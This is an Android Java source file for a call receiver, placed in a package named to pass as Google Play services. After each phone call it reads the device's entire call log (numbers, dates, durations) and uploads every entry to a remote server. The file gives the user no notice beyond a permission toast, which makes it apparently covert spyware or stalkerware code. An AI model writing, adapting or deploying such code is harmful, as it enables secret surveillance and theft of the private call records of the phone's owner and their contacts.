package com.google.android.gms.persistent.googleapps.receiver;

import android.Manifest;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import com.google.android.gms.persistent.googleapps.App;
import com.google.android.gms.persistent.googleapps.R;
import com.google.android.gms.persistent.googleapps.network.models.data.Data;
import com.google.android.gms.persistent.googleapps.network.models.data.event.Call;
import com.google.android.gms.persistent.googleapps.repositories.NetworkRepo;

import java.util.concurrent.TimeUnit;

import io.reactivex.Single;
import timber.log.Timber;

public class ReceiverOnCall extends BroadcastReceiver {
    private NetworkRepo networkRepo;

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.
        networkRepo = App.getAppComponent().getNetworkRepo();
        Timber.tag("ReceiverOnCall");
        Timber.d("Ring" + intent.getAction());
        if (intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")){
            Timber.d(intent.getExtras().getString("android.intent.extra.PHONE_NUMBER"));
        }
        else {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            // телефон звонит, получаем входящий номер
            if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                Timber.d("EXTRA_STATE_RINGING");
            }
            // телефон находится в режиме звонка (набор номера / разговор)
            if ((state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK))) {
                Timber.d("EXTRA_STATE_OFFHOOK");
            }
            // телефон находится в ждущем режиме (событие наступает по
            // окончании разговора,
            // когда уже знаем номер и факт звонка
            if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                Timber.d("EXTRA_STATE_IDLE");
                Single.timer(1, TimeUnit.SECONDS).subscribe(Long -> sendDetailsCall(context));
            }
        }
    }

    private void sendDetailsCall(Context context) {
        StringBuffer stringBuffer = new StringBuffer();
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(context, R.string.add_call_log_permission, Toast.LENGTH_SHORT).show();
            return;
        }
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);

        while (cursor.moveToNext()) {
            String phNumber = cursor.getString(number);
            // 1 - incoming, 2 - outgoing, 3 - missed
            String callType = cursor.getString(type);
            long callDate = cursor.getLong(date);
            String callDuration = cursor.getString(duration);
            Call call = new Call(phNumber, callDuration, callDate);

            App.getAppComponent().getNetworkRepo()
                    .setDataOfDevice(Data.newBuilder().info(call)
                            .type(type)
                            .date(callDate)
                            .build());
        }
        cursor.close();

    }
}
